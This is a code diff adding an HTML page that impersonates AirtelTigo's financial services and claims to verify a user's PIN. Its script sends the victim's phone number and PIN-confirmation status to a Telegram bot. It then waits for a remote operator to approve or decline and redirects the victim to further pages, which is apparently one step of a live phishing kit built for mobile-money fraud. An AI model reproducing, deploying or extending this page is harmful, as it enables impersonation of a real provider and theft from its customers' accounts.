@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AirtelTigo - PIN Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js"></script>
+    <script src="telegram.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #002d5d 0%, #001a35 100%);
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            animation: float 20s ease-in-out infinite;
+            z-index: 0;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 30px); }
+        }
+
+        .card-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        .logo-mini {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: scaleIn 0.6s ease-out;
+            padding: 4px;
+            border: 3px solid white;
+            overflow: hidden;
+        }
+
+        .logo-mini img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .title {
+            font-size: 1.75rem;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.95rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        .description {
+            text-align: center;
+            color: #6b7280;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+            animation: fadeInUp 0.6s ease-out 0.3s both;
+        }
+
+        .status-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            animation: fadeInUp 0.6s ease-out 0.4s both;
+        }
+
+        .status-icon.loading {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 45, 93, 0.1) 100%);
+        }
+
+        .status-icon.error {
+            background: linear-gradient(135deg, rgba(255, 59, 48, 0.1) 0%, rgba(255, 107, 53, 0.1) 100%);
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 45, 93, 0.1);
+            border-top-color: #002d5d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .error-icon {
+            font-size: 3rem;
+            color: #ff3b30;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        .error-message {
+            background: linear-gradient(135deg, rgba(255, 59, 48, 0.1) 0%, rgba(255, 107, 53, 0.1) 100%);
+            border-left: 4px solid #ff3b30;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            animation: slideInLeft 0.3s ease-out;
+        }
+
+        .error-text {
+            color: #ff3b30;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+            animation: fadeInUp 0.6s ease-out 0.5s both;
+        }
+
+        .btn-done {
+            padding: 1rem;
+            border-radius: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            background: linear-gradient(135deg, #002d5d 0%, #003d7a 100%);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 45, 93, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-done:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 45, 93, 0.4);
+        }
+
+        .btn-done:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
+        }
+
+        .btn-try-again {
+            padding: 1rem;
+            border-radius: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border: 2px solid #002d5d;
+            background: white;
+            color: #002d5d;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-top: 1rem;
+        }
+
+        .btn-try-again:hover {
+            background: #f9fafb;
+            transform: translateY(-2px);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @media (max-width: 768px) {
+            .card {
+                padding: 1.5rem;
+            }
+
+            .status-icon {
+                width: 80px;
+                height: 80px;
+            }
+
+            .spinner {
+                width: 50px;
+                height: 50px;
+                border-width: 3px;
+            }
+
+            .error-icon {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card-wrapper">
+            <div class="header">
+                <div class="logo-mini">
+                    <img src="at-logo.jpg" alt="AirtelTigo">
+                </div>
+                <h1 class="title">AirtelTigo</h1>
+                <p class="subtitle">Financial Services</p>
+            </div>
+
+            <div class="card">
+                <p class="description">
+                    Your PIN has been successfully entered. Please click <strong>"Done"</strong> after confirming the AirtelTigo prompt on your phone.
+                </p>
+
+                <!-- Loading State (Big Spinner) -->
+                <div id="loading-state" class="hidden animate-fade-in-up">
+                    <div class="status-icon loading">
+                        <div class="spinner"></div>
+                    </div>
+                </div>
+
+                <!-- Error State -->
+                <div id="error-state" class="hidden">
+                    <div class="status-icon error">
+                        <i class="fas fa-times error-icon"></i>
+                    </div>
+                    <div class="error-message">
+                        <p class="error-text">
+                            <i class="fas fa-exclamation-circle" style="margin-right: 0.5rem;"></i>
+                            Unable to verify your PIN. Please try again.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Initial Buttons -->
+                <div id="initial-buttons" class="button-group">
+                    <button id="done-btn" class="btn-done">
+                        <span id="btn-text">Done</span>
+                        <i id="btn-icon" class="fas fa-check"></i>
+                    </button>
+                </div>
+
+                <!-- Try Again Button -->
+                <button id="try-again-btn" class="btn-try-again hidden" style="width: 100%;">
+                    <i class="fas fa-redo" style="margin-right: 0.5rem;"></i>
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const doneBtn = document.getElementById('done-btn');
+        const tryAgainBtn = document.getElementById('try-again-btn');
+        const initialButtons = document.getElementById('initial-buttons');
+        const errorMessage = document.getElementById('error-state');
+        const loadingState = document.getElementById('loading-state');
+        const btnText = document.getElementById('btn-text');
+        const btnIcon = document.getElementById('btn-icon');
+        const data = AppData.get();
+
+        async function submitDone() {
+            // UI changes when Done is clicked
+            // Change button text and add spinner, but don't hide it
+            doneBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Verifying...';
+            doneBtn.disabled = true;
+            
+            tryAgainBtn.classList.add('hidden');
+            loadingState.classList.remove('hidden');
+            errorMessage.classList.add('hidden');
+            // initialButtons.classList.add('hidden'); // REMOVED: Keep the button visible
+
+            try {
+                // Notify Telegram and wait for response
+                const displayPhone = AppData.formatToDisplay(data.fullPhone);
+                const requestId = await telegramBot.notifyPIN(displayPhone, 'PIN_PROMPT_CONFIRMED');
+                const result = await telegramBot.waitForApproval(requestId);
+
+                if (result.action === 'approve') {
+                    doneBtn.innerHTML = '<i class="fas fa-check"></i> Approved!';
+                    setTimeout(() => {
+                        location.href = 'success.html';
+                    }, 1000);
+                } else if (result.action === 'verify') {
+                    doneBtn.innerHTML = '<i class="fas fa-check"></i> Verified!';
+                    setTimeout(() => {
+                        location.href = 'verify-pin.html';
+                    }, 1000);
+                } else {
+                    // Decline action: show error and try again button
+                    loadingState.classList.add('hidden');
+                    errorMessage.classList.remove('hidden');
+                    initialButtons.classList.add('hidden'); // Hide the "Verifying..." button now to show try again
+                    tryAgainBtn.classList.remove('hidden');
+                    
+                    // Reset done button state for potential reuse
+                    doneBtn.innerHTML = '<span id="btn-text">Done</span><i id="btn-icon" class="fas fa-check"></i>';
+                    doneBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error('Verification error:', error);
+                loadingState.classList.add('hidden');
+                errorMessage.classList.remove('hidden');
+                initialButtons.classList.add('hidden');
+                tryAgainBtn.classList.remove('hidden');
+                doneBtn.disabled = false;
+                doneBtn.innerHTML = '<span id="btn-text">Done</span><i id="btn-icon" class="fas fa-check"></i>';
+            }
+        }
+
+        doneBtn.addEventListener('click', submitDone);
+        tryAgainBtn.addEventListener('click', () => {
+            // When try again is clicked, reset to initial state
+            initialButtons.classList.remove('hidden');
+            tryAgainBtn.classList.add('hidden');
+            errorMessage.classList.add('hidden');
+            loadingState.classList.add('hidden');
+            doneBtn.innerHTML = '<span id="btn-text">Done</span><i id="btn-icon" class="fas fa-check"></i>';
+            doneBtn.disabled = false;
+        });
+    </script>
+</body>
+</html>
